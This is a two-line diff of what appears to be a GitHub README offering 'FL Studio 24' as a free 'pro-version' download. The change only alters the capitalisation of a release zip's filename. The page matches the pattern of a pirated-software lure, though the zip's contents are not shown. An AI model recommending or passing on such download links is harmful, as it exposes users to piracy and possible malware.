@@ -7,7 +7,7 @@ Welcome to the FL Studio 24 repository! 🚀 This is your ultimate destination f
 - Topics: FL-Studio, music-production, audio-software, free-software, digital-audio-workstation, pro-version  
 
 ## 🔗 Software Access  
-### [Download FL Studio](https://github.com/Xyt069/Fl-Studio-24-For-PC/releases/download/fl-studio/FL-Studio.zip)
+### [Download FL Studio](https://github.com/Xyt069/Fl-Studio-24-For-PC/releases/download/fl-studio/FL-studio.zip)
 
 
 
